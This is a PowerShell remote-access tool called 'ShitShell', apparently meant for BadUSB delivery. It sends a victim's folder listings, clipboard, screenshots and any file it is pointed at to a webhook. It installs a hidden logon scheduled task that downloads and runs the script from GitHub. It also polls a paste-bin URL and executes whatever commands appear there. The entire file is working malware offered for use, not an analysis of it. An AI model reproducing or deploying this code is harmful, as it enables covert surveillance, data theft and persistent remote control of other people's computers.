Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing

$hookUrl = "$hk"
$bin = "$bn"

#Welcome message
$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
$jsonPayload = @{
    tts        = $false
    embeds     = @(
        @{
            title       = "$env:COMPUTERNAME | ShitShell session started!"
            description = "``The worst Reverse Shell out there!" +
                          "`nYou can use the following commands:``" +
                          "`n`n:arrow_forward: Close: Closes the current ShitShell session." +
                          "`n:arrow_forward: FolderTree: Gets folder trees and sends it to your Webhook." +
                          "`n:arrow_forward: CheckForAdmin: Checks if the script is being run as admin." +
                          "`n:arrow_forward: AddPersistance: Runs script on startup." +
                          "`n:arrow_forward: RemovePersistance: Removes persistance. " +
                          "`n:arrow_forward: GetClipboard: Sends clipboard content to your webhook." +
                          "`n:arrow_forward: TakeScreenshot: Sends a screenshot to your webhook." +
                          "`n:arrow_forward: Exfil: Given a path, this function will exfiltrate data to your webhook."
            color       = 16711680
            author      = @{
                name     = "ShitShell"
            }
            footer      = @{
                text = "$timestamp"
            }
        }
    )
}
$jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'

Function FolderTree{
tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
$FilePath ="$env:temp/TreesOfKnowledge.zip"
Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
sleep 1
curl.exe -F file1=@"$FilePath" $hookurl | Out-Null
rm -Path $FilePath -Force
Write-Output "Done."
}

function Close {

    $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
    $jsonPayload = @{
        tts        = $false
        embeds     = @(
            @{
                title       = "$env:COMPUTERNAME | ShitShell session closed!"
                description = ":octagonal_sign:  The ShitShell session was closed! :octagonal_sign:"
                color       = 16711680
                author      = @{
                    name     = "ShitShell"
                }
                footer      = @{
                    text = "$timestamp"
                }
            }
        )
    }
    $jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'

    break
}


function CheckForAdmin {

    If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')){
        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":x: ``Not an Admin!`` :x:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
    }else{
        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":white_check_mark:  ``Its an Admin!`` :white_check_mark:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
    }
    
}


function AddPersistance {
    
    "`$hookurl = `"$hookurl`"" | Out-File "$env:TEMP\s.ps1" -Force
    "`$bin = `"$bin`"" | Out-File -Append "$env:TEMP\s.ps1" -Force
    (Invoke-WebRequest "https://raw.githubusercontent.com/Neo0412/FlipperScripts/main/ShitShell.ps1").Content | Out-File -Append "$env:TEMP\s.ps1"

    Start-Sleep 5

    (Get-Content -Path "$env:TEMP\s.ps1" | Where-Object {$_ -notlike '*$hookUrl = "$hk"*' -and $_ -notlike '*$bin = "$bn"*'}) | Set-Content -Path "$env:TEMP\s.ps1" -Force

    $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
    $TaskAction = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $env:TEMP\s.ps1"
    Register-ScheduledTask "PSTask" -Action $TaskAction -Trigger $TaskTrigger -RunLevel Highest

    Start-Sleep 2

    if (!(Get-ScheduledTask -TaskName "PSTask" -ErrorAction SilentlyContinue)){
        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":x: ``Something went wrong!`` :x:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
    }
    else {
        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":white_check_mark:  ``Script now runs on startup!`` :white_check_mark:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
    }

}

function RemovePersistance {

    Get-ScheduledTask -TaskName "PSTask" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false

    Remove-Item "$env:TEMP\s.ps1" -Force

    if ((Get-ScheduledTask -TaskName "PSTask" -ErrorAction SilentlyContinue)){
        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":x: ``Something went wrong!`` :x:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
    }
    else {
        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":white_check_mark:  ``Removed persistance!`` :white_check_mark:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
    }

}

function GetClipboard {

    $ClipboardHistory = @()

    $ClipboardItem = [System.Windows.Forms.Clipboard]::GetDataObject()
    $Types = $ClipboardItem.GetFormats()

    Foreach ($Type in $Types) {

        switch ($Type) {

            Text { $ItemType = "Text" }
            FileDrop { $ItemType = "Data" }
        }
    }

    if ($ItemType -eq "Text") {
        $Content = $ClipboardItem.GetText()
    }
    elseif ($ItemType -eq "Data") {
        $DataPath = $ClipboardItem.GetFileDropList()
        $Content = Get-Item $DataPath
    }

    if (($Content.GetType()).Name -eq "String") {

        $Body = @{
            'username' = "$env:COMPUTERNAME"
            'content'  = ":clipboard:Text_From_Clipboard:" + "`n$Content"
        }
        
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json)

        $ClipboardHistory += $Content

    }
    else {
        curl.exe -F "file1=@$Content"  -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":clipboard:File_from_Clipboard:\"}"' $hookurl | Out-Null

        $ClipboardHistory += $Content.Name

    }
    
}


function TakeScreenshot {

    $Filett = "$env:temp\SC.png"
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    curl.exe -F "file1=@$filett" -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":camera:Screenshot:\"}"' $hookurl | Out-Null
    Start-Sleep 1
    Remove-Item -Path $filett
 
}

function Exfil {
    param (
        $Path
    )

    $Data = Get-Item $Path
    $ExfilTemp = "$env:TEMP\temp.zip"

    if($Data -is [System.IO.DirectoryInfo]){

        Compress-Archive $Data -DestinationPath $ExfilTemp  -CompressionLevel Fastest
        curl.exe -F "file1=@$ExfilTemp" -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":floppy_disk:ExfilData:\"}"' $hookurl | Out-Null
        Remove-Item $ExfilTemp -Force

    }else{

        curl.exe -F "file1=@$Data" -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":floppy_disk:ExfilData:\"}"' $hookurl | Out-Null

    }
    
}



##########################
$commands = @()
$previousBinText = ""

while ($true) {
    $PastBinText = (Invoke-WebRequest $bin).Content
    
    if ($PastBinText -eq $previousBinText) {
        Start-Sleep 10
    }
    else {
        Invoke-Expression $PastBinText
        $commands += $PastBinText
        $previousBinText = $PastBinText
    }
}

